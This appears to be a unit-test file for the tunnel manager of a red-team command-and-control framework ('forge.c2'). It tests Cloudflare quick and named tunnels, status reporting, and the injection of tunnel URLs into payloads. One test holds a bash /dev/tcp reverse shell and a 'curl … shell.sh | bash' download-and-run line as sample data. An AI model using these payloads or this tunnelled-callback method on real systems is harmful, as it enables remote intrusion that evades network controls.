"""Unit tests for Cloudflare Tunnel Manager.

Tests tunnel lifecycle, URL injection, and audit logging.
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
import subprocess
import time
from pathlib import Path

from forge.c2.tunnel_manager import TunnelManager, TunnelState


class TestTunnelManager:
    """Test TunnelManager class."""

    def test_init_without_cloudflared(self):
        """Test initialization when cloudflared is not installed."""
        with patch.object(
            TunnelManager,
            'CLOUDFLARED_PATH',
            Path('/nonexistent/cloudflared.exe')
        ):
            tm = TunnelManager(roe_id="ROE-TEST-001")
            assert tm._verify_platform() is False

    def test_init_with_roe(self):
        """Test initialization with ROE ID."""
        tm = TunnelManager(
            roe_id="ROE-TEST-001",
            scope_manifest={"test": "data"}
        )
        assert tm.roe_id == "ROE-TEST-001"
        assert tm.scope_manifest == {"test": "data"}

    def test_get_tunnel_url_no_tunnel(self):
        """Test get_tunnel_url when no tunnel is active."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        assert tm.get_tunnel_url() is None

    def test_stop_tunnel_when_inactive(self):
        """Test stop_tunnel when no tunnel is active."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        result = tm.stop_tunnel()
        assert result is True

    def test_inject_tunnel_url_no_tunnel(self):
        """Test payload injection when no tunnel is active."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        payloads = ["test payload with RHOSTPlaceholder"]
        result = tm.inject_tunnel_to_payloads(payloads)
        # Should return original payloads when no tunnel
        assert result == payloads

    def test_inject_tunnel_url_with_tunnel(self):
        """Test payload injection with active tunnel."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        
        # Mock active tunnel
        mock_process = MagicMock()
        mock_process.poll.return_value = None  # Process is running
        tm._active_tunnel = TunnelState(
            url="https://test.trycloudflare.com",
            local_port=4444,
            process=mock_process,
            started_at=time.time(),
            tunnel_type="quick"
        )

        payloads = [
            "bash -i >& /dev/tcp/RHOSTPlaceholder/4444 0>&1",
            "curl http://{RHOST}:4444/shell.sh | bash"
        ]
        
        injected = tm.inject_tunnel_to_payloads(payloads)
        
        assert "test.trycloudflare.com" in injected[0]
        assert "test.trycloudflare.com" in injected[1]
        assert "RHOSTPlaceholder" not in injected[0]
        assert "{RHOST}" not in injected[1]

    def test_get_tunnel_status_inactive(self):
        """Test get_tunnel_status when no tunnel is active."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        status = tm.get_tunnel_status()
        
        assert status["active"] is False
        assert status["url"] is None
        assert status["uptime_seconds"] == 0

    def test_get_tunnel_status_active(self):
        """Test get_tunnel_status with active tunnel."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        
        # Mock active tunnel
        mock_process = MagicMock()
        mock_process.poll.return_value = None
        tm._active_tunnel = TunnelState(
            url="https://test.trycloudflare.com",
            local_port=4444,
            process=mock_process,
            started_at=time.time(),
            tunnel_type="quick"
        )

        status = tm.get_tunnel_status()
        
        assert status["active"] is True
        assert status["url"] == "https://test.trycloudflare.com"
        assert status["tunnel_type"] == "quick"
        assert status["uptime_seconds"] >= 0

    def test_audit_log(self):
        """Test audit logging."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        
        # Should not raise
        tm._audit_log(
            action="test_action",
            details={"test_key": "test_value"}
        )

    def test_context_manager_cleanup(self):
        """Test context manager ensures tunnel cleanup."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        
        with patch.object(tm, 'stop_tunnel') as mock_stop:
            mock_stop.return_value = True
            
            with tm:
                pass
            
            # stop_tunnel should be called on exit
            mock_stop.assert_called_once()

    @patch('subprocess.Popen')
    def test_start_quick_tunnel_success(self, mock_popen):
        """Test successful quick tunnel startup."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        
        # Mock cloudflared path
        with patch.object(
            TunnelManager,
            'CLOUDFLARED_PATH',
            Path('/fake/cloudflared.exe')
        ):
            with patch.object(tm, '_verify_platform', return_value=True):
                # Mock process with tunnel URL in output
                mock_process = MagicMock()
                mock_process.stdout.readline.side_effect = [
                    "Your quick Tunnel is ready: https://abc123.trycloudflare.com\n",
                    ""  # EOF
                ]
                mock_process.poll.return_value = None
                mock_popen.return_value = mock_process

                url = tm.start_quick_tunnel(local_port=4444)
                
                assert url == "https://abc123.trycloudflare.com"
                assert tm._active_tunnel is not None

    @patch('subprocess.Popen')
    def test_start_named_tunnel_success(self, mock_popen):
        """Test successful named tunnel startup."""
        tm = TunnelManager(roe_id="ROE-TEST-001")
        
        # Mock cloudflared path and config
        config_path = Path("/fake/config.yml")
        
        with patch.object(
            TunnelManager,
            'CLOUDFLARED_PATH',
            Path('/fake/cloudflared.exe')
        ):
            with patch.object(Path, 'exists', return_value=True):
                with patch.object(tm, '_verify_platform', return_value=True):
                    # Mock process with registered connection
                    mock_process = MagicMock()
                    mock_process.stdout.readline.side_effect = [
                        "Registered tunnel connection conn-abc123\n",
                        ""
                    ]
                    mock_process.poll.return_value = None
                    mock_popen.return_value = mock_process

                    url = tm.start_named_tunnel(
                        tunnel_name="forge-c2",
                        config_path=config_path
                    )
                    
                    assert url == "https://forge-c2.trycloudflare.com"
                    assert tm._active_tunnel is not None


@pytest.mark.integration
class TestTunnelManagerIntegration:
    """Integration tests for TunnelManager (requires cloudflared)."""

    @pytest.mark.skip(reason="Requires cloudflared installation")
    def test_real_quick_tunnel(self):
        """Test real quick tunnel startup (requires cloudflared)."""
        tm = TunnelManager(roe_id="ROE-INTEGRATION-TEST")
        
        url = tm.start_quick_tunnel(local_port=4444, timeout_seconds=60)
        
        if url:
            assert "trycloudflare.com" in url
            tm.stop_tunnel()
        else:
            pytest.skip("cloudflared not available")
